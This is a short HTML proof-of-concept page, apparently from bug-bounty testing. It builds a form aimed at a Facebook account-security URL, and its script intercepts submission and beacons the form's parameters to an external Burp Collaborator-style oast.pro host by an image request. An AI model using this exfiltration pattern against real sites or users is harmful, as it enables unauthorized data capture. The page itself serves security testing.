<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Form GET Parameters</title>
</head>
<body>
    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
        <input type="hidden" name="hide_back_button" value="1">
        <input type="hidden" name="from_accounts_center" value="1">
        <input type="submit" value="Send">
    </form>
    <script>
        // Function to capture form GET parameters
        function captureFormGETParameters() {
            var form = document.getElementById('myForm');
            var formData = new FormData(form); // Extract form data
            var queryString = new URLSearchParams(formData).toString(); // Convert form data to query string
            // Send the GET parameters to the Burp Suite collaborator
            var img = new Image();
            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?getParameters=" + encodeURIComponent(queryString);
        }

        // Function to intercept form submission and capture GET parameters
        function interceptFormSubmission(event) {
            event.preventDefault(); // Prevent the form from being submitted
            captureFormGETParameters();
            // Perform form submission (optional, if you want to submit the form)
            //document.getElementById('myForm').submit();
        }

        // Call the function to intercept form submission when the page loads
        window.onload = function() {
            document.getElementById('myForm').addEventListener('submit', interceptFormSubmission);
        };
    </script>
</body>
</html>
